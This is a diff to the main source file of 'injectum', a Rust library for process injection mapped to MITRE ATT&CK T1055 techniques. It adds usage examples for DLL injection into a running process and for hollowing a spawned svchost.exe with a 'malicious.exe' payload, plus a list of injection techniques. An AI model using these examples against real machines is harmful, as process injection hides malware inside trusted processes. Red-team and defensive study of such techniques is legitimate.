@@ -7,45 +7,76 @@
 //! ## Core Architecture
 //!
 //! The library is built around a unidirectional data flow:
-//! **Builder** $\to$ **Configuration** $\to$ **Factory** $\to$ **Execution**.
+//! **Builder** -> **Configuration** -> **Factory** -> **Execution**.
 //!
-//! ## Usage Example
+//! Users can choose between two primary interfaces:
+//! 1. **[`InjectorBuilder`]:** A fluent interface for constructing and validating injection requests. (Recommended)
+//! 2. **[`Injector`]:** The stateless driver for running a fully constructed configuration directly.
 //!
-//! The following example demonstrates how to perform a **Classic DLL Injection** (T1055.001)
-//! into a remote process.
+//! ## Usage Examples
+//!
+//! ### 1. Classic DLL Injection (Remote Process)
+//!
+//! This example demonstrates targeting an existing process ID (PID) to load a DLL from disk.
 //!
 //! ```rust,no_run
 //! use injectum::{
-//!     InjectorBuilder, InjectumError, Payload, PayloadMetadata, StrategyType, Target, Technique
+//!     InjectorBuilder, Error, Payload, PayloadMetadata, Result, Target, Technique,
+//!     method::DynamicLinkLibrary
 //! };
 //! use std::path::PathBuf;
 //!
-//! fn main() -> Result<(), InjectumError> {
-//!     // 1. Define the payload (e.g., a DLL on disk)
+//! fn main() -> injectum::Result<()> {
+//!     // 1. Define the payload
+//!     // For Classic Injection, the 'file_path' is mandatory.
 //!     let payload = Payload::DllFile {
-//!         path: Some(PathBuf::from("C:\\temp\\payload.dll")),
-//!         image: None, // Not needed for Classic injection
-//!         meta: PayloadMetadata {
-//!             description: Some("Test Payload".into()),
-//!             safe_sample: true,
-//!             ..Default::default()
-//!         },
+//!         file_path: Some(PathBuf::from("C:\\temp\\payload.dll")),
+//!         image_bytes: None,
+//!         metadata: PayloadMetadata::default(),
 //!     };
 //!
-//!     // 2. Select the strategy (DLL Injection -> Classic Method)
-//!     // Strategies are resolved at runtime via the Factory.
-//!     let strategy = StrategyType::new(Technique::T1055_001, Some("Classic"));
+//!     // 2. Configure the technique (T1055.001 -> Classic)
+//!     let technique = Technique::T1055_001(DynamicLinkLibrary::Classic);
 //!
-//!     // 3. Select the target (Remote Process ID)
-//!     let target = Target::Pid(1024);
-//!
-//!     // 4. Build and Execute
-//!     // The builder ensures the configuration is valid before execution.
+//!     // 3. Build and Execute targeting a PID
 //!     InjectorBuilder::new()
-//!         .target(target)
+//!         .target(Target::Pid(1024))
+//!         .technique(technique)
 //!         .payload(payload)
-//!         .strategy(strategy)
-//!         .execute()?; // Compile and run
+//!         .execute()?;
+//!
+//!     Ok(())
+//! }
+//! ```
+//!
+//! ### 2. Process Hollowing (Spawned Process)
+//!
+//! This example shows how to spawn a suspended process and "hollow" it out with a new PE payload.
+//! Note the use of [`Payload::from_file`] for automatic type detection.
+//!
+//! ```rust,no_run
+//! use injectum::{
+//!     InjectorBuilder, Payload, PayloadMetadata, Target, Technique,
+//!     method::ProcessHollowing
+//! };
+//! use std::path::PathBuf;
+//!
+//! fn main() -> injectum::Result<()> {
+//!     // 1. Load payload from disk (Automatically detects EXE vs DLL)
+//!     let payload = Payload::from_file(
+//!         "C:\\temp\\malicious.exe",
+//!         PayloadMetadata::default()
+//!     )?;
+//!
+//!     // 2. Configure the technique (T1055.012 -> Process Hollowing)
+//!     let technique = Technique::T1055_012(ProcessHollowing::Standard);
+//!
+//!     // 3. Build and Execute targeting a new process
+//!     InjectorBuilder::new()
+//!         .target(Target::Spawn(PathBuf::from("C:\\Windows\\System32\\svchost.exe")))
+//!         .technique(technique)
+//!         .payload(payload)
+//!         .execute()?;
 //!
 //!     Ok(())
 //! }
@@ -58,41 +89,61 @@
 //!
 //! ```toml
 //! [features]
-//! T1055_001 = [] # Dynamic-link Library Injection
-//! T1055_002 = [] # Portable Executable Injection
-//! T1055_003 = [] # Thread Execution Hijacking
-//! # ...
+//! default   = ["tracing", "full"]
+//! tracing   = [] # Enable structured logging via the `tracing` crate
+//!
+//! # MITRE ATT&CK Techniques
+//! T1055_001 = [] # Dynamic-link Library Injection (Windows)
+//! T1055_002 = [] # Portable Executable Injection (Windows)
+//! T1055_003 = [] # Thread Execution Hijacking (Windows)
+//! T1055_004 = [] # Asynchronous Procedure Call (Windows)
+//! T1055_005 = [] # Thread Local Storage (Windows)
+//! T1055_008 = [] # Ptrace System Calls (Linux)
+//! T1055_009 = [] # Proc Memory (Windows)
+//! T1055_011 = [] # Extra Window Memory Injection (Windows)
+//! T1055_012 = [] # Process Hollowing (Windows)
+//! T1055_013 = [] # Process Doppelgänging (Windows)
+//! T1055_014 = [] # VDSO Hijacking (Linux)
+//! T1055_015 = [] # ListPlanting (Windows)
 //! ```
 
-/// The builder module for constructing injection configurations.
 pub mod builder;
-/// Error types for injection failures and validation.
 pub mod error;
-/// Internal factory for strategy instantiation.
 pub(crate) mod factory;
-/// The core execution engine.
 pub mod injector;
-/// Data structures for injection material and metadata.
 pub mod payload;
-/// Injection strategies and MITRE ATT&CK technique mapping.
 pub mod strategy;
-/// Abstractions for injection targets (PID vs None).
 pub mod target;
 
-// Re-exports (Public API)
+// Core API (Root Namespace)
 pub use builder::InjectorBuilder;
-pub use error::InjectumError;
+pub use error::{Error, Result};
 pub use injector::Injector;
 pub use payload::{Payload, PayloadMetadata};
-pub use strategy::{Method, StrategyType, Technique};
+pub use strategy::Technique;
 pub use target::Target;
 
-// Re-export log macros for internal use across modules.
-// This allows strategy files to use `crate::debug!` regardless of the logging backend.
+// Configuration API (Grouped Namespace)
+// Helper module to access specific technique configurations.
+pub mod method {
+    #[cfg(all(feature = "T1055_001", target_os = "windows"))]
+    pub use crate::strategy::DynamicLinkLibrary;
+
+    #[cfg(all(feature = "T1055_002", target_os = "windows"))]
+    pub use crate::strategy::PortableExecutable;
+
+    #[cfg(all(feature = "T1055_004", target_os = "windows"))]
+    pub use crate::strategy::AsynchronousProcedureCall;
+
+    #[cfg(all(feature = "T1055_012", target_os = "windows"))]
+    pub use crate::strategy::ProcessHollowing;
+}
+
 #[cfg(feature = "tracing")]
 #[allow(unused_imports)]
 pub(crate) use tracing::{debug, error, info, warn};
 
+// Stub macros to allow compiling without the 'tracing' feature
 #[cfg(not(feature = "tracing"))]
 mod stealth {
     #[macro_export]
